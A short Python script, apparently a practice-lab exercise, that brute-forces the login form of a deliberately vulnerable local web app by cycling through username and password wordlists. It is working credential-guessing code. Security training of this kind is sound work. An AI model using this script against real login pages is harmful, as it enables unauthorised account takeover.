#!/usr/bin/env python3

# ----------------------------------------------------

import requests

BASE_URL = "http://localhost:80"
PROXIES = { "http": "http://localhost:8080", "https": "https://localhost:8080" }

PHPSESSID = "il0ci7c322dqm1vhvsv1n9m3j1"

USERNAME_WORDLIST = "./data/usernames.txt"
PASSWORD_WORDLIST = "./data/passwords.txt"

# ----------------------------------------------------

def check_credentials(user, password):
    global BASE_URL, PHPSESSID, PROXIES

    url = BASE_URL + "/vulnerabilities/brute/"
    custom_params = { "username": user, "password": password, "Login": "Login" }
    custom_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Cookie": f"PHPSESSID={PHPSESSID}; security=low"
    }

    r = requests.get(url, headers=custom_headers, params=custom_params, proxies=PROXIES)

    return not "Username and/or password incorrect." in r.text

def get_wordlist(wordlist_path):
    return open(wordlist_path, "r").read().splitlines()

def bruteforce_low():
    global USERNAME_WORDLIST, PASSWORD_WORDLIST

    usernames = get_wordlist(USERNAME_WORDLIST)
    passwords = get_wordlist(PASSWORD_WORDLIST)

    print(f"[INFO]: Loaded {len(usernames)} usernames")
    print(f"[INFO]: Loaded {len(passwords)} passwords")

    for user in usernames:
        for password in passwords:
            if check_credentials(user, password):
                print(f"[INFO]: Found credentials! ({user}, {password})")
                break

# ----------------------------------------------------

def main():
    bruteforce_low()

if __name__ == "__main__":
    main()
